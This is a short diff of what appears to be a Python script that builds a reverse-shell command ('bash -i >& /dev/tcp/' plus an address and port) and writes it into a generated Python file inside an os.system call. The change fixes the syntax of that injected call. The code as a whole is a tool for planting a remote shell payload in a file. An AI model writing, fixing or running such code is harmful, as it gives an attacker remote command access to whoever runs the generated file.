@@ -19,7 +19,7 @@ payload = "bash -i >& /dev/tcp/" + addr + "/" + prt + " 0>&1"
 try:
   with open(file_path, 'w') as file:
       file.write("import sys\nimport os\nimport time\nimport random")
-      file.write("os.system" + payload)
+      file.write("os.system(" + payload + ")")
   print(f"File '{file_path}' created successfully, containing: " + file.read())
 
 except:
